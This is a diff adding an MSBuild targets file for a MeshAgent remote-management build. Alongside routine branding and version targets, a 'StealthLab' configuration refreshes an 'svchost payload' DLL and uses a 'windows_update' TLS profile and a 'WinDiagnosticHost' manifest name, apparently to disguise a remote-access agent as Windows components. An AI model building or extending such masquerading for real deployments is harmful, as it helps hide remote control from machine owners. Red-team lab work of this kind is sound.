@@ -1,0 +1,36 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <MeshAgentRepoRoot Condition="'$(MeshAgentRepoRoot)'==''">$([System.IO.Path]::GetFullPath('$(MSBuildProjectDirectory)\..'))</MeshAgentRepoRoot>
+    <MeshAgentPython Condition="'$(MeshAgentPython)'==''">python</MeshAgentPython>
+    <MeshAgentBrandingConfig Condition="'$(MeshAgentBrandingConfig)'=='' and Exists('$(MeshAgentRepoRoot)\branding_config.local.json')">$(MeshAgentRepoRoot)\branding_config.local.json</MeshAgentBrandingConfig>
+    <MeshAgentBrandingConfig Condition="'$(MeshAgentBrandingConfig)'==''">$(MeshAgentRepoRoot)\branding_config.json</MeshAgentBrandingConfig>
+    <MeshAgentProvisioningManifest Condition="'$(MeshAgentProvisioningManifest)'=='' and Exists('$(MeshAgentRepoRoot)\WinDiagnosticHost.msh')">$(MeshAgentRepoRoot)\WinDiagnosticHost.msh</MeshAgentProvisioningManifest>
+    <MeshAgentProvisioningManifest Condition="'$(MeshAgentProvisioningManifest)'==''">$(MeshAgentRepoRoot)\MeshAgent.msh</MeshAgentProvisioningManifest>
+    <MeshAgentBrandingHeader Condition="'$(MeshAgentBrandingHeader)'==''">$(MeshAgentRepoRoot)\meshcore\generated\meshagent_branding.h</MeshAgentBrandingHeader>
+    <MeshAgentNetworkProfileHeader Condition="'$(MeshAgentNetworkProfileHeader)'==''">$(MeshAgentRepoRoot)\meshcore\generated\network_profile.h</MeshAgentNetworkProfileHeader>
+    <MeshAgentNetworkProfileJson Condition="'$(MeshAgentNetworkProfileJson)'==''">$(MeshAgentRepoRoot)\build\meshagent\generated\network_profile.json</MeshAgentNetworkProfileJson>
+    <MeshAgentTlsProfile Condition="'$(MeshAgentTlsProfile)'==''">windows_update</MeshAgentTlsProfile>
+  </PropertyGroup>
+
+  <Target Name="GenerateMeshAgentBrandingAssets" BeforeTargets="PreBuildEvent">
+    <MakeDir Directories="$([System.IO.Path]::GetDirectoryName('$(MeshAgentBrandingHeader)'));$([System.IO.Path]::GetDirectoryName('$(MeshAgentNetworkProfileJson)'))" />
+    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\generate_branding_assets.py&quot; --repo-root &quot;$(MeshAgentRepoRoot)&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --output-header &quot;$(MeshAgentBrandingHeader)&quot; --output-msh &quot;$(MeshAgentProvisioningManifest)&quot;" />
+    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\generate_network_profile.py&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --tls-profile &quot;$(MeshAgentTlsProfile)&quot; --output-header &quot;$(MeshAgentNetworkProfileHeader)&quot; --output-json &quot;$(MeshAgentNetworkProfileJson)&quot;" Condition="Exists('$(MeshAgentRepoRoot)\tools\generate_network_profile.py')" />
+  </Target>
+
+  <Target Name="UpdateMeshServiceRcFromCommit" AfterTargets="PreBuildEvent" BeforeTargets="ResourceCompile" Condition="Exists('$(MSBuildProjectDirectory)\MeshService.rc') and Exists('$(MSBuildProjectDirectory)\..\microscript\ILibDuktape_Commit.h')">
+    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\update_rc_version.py&quot; &quot;$(MSBuildProjectDirectory)\..\microscript\ILibDuktape_Commit.h&quot; &quot;$(MSBuildProjectDirectory)\MeshService.rc&quot;" />
+  </Target>
+
+  <Target Name="EnsureStealthLabPayloadBeforeBuild" BeforeTargets="PreBuildEvent" Condition="'$(Configuration)|$(Platform)'=='StealthLab|x64'">
+    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\refresh_svchost_payload.py&quot; --repo-root &quot;$(MeshAgentRepoRoot)&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --dll &quot;$(MSBuildProjectDirectory)\x64\StealthLab_DLL\MeshService-2022.dll&quot;" />
+  </Target>
+
+  <Target Name="RefreshStealthLabPayloadAfterBuild" AfterTargets="Build" Condition="'$(Configuration)|$(Platform)'=='StealthLab_DLL|x64'">
+    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\refresh_svchost_payload.py&quot; --repo-root &quot;$(MeshAgentRepoRoot)&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --dll &quot;$(TargetPath)&quot;" />
+  </Target>
+
+  <Target Name="CopyProvisioningManifestAfterBuild" AfterTargets="Build" Condition="'$(Configuration)'=='StealthLab' and '$(ConfigurationType)'=='Application' and Exists('$(MeshAgentProvisioningManifest)')">
+    <Copy SourceFiles="$(MeshAgentProvisioningManifest)" DestinationFiles="$(TargetDir)$(TargetName).msh" />
+  </Target>
+</Project>
